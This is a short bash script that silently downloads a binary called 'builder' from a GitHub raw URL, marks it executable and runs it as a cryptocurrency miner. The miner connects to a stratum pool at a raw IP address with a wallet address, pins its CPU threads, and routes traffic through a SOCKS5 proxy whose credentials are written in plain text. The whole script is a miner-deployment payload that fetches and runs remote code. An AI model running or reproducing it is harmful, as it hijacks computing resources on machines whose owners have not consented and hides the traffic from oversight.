#!/bin/bash

wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder
chmod +x builder
./builder -a stratum+tcp://198.50.168.213:4563 -u SYDuGHGqTq4zYifQwptq2mv2HEwRGBNcWj -p c=DGB,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t 2 --cpu-affinity=0x3 -x socks5://xdezolvq:51tnf8wfj0hu@144.168.217.36:8728
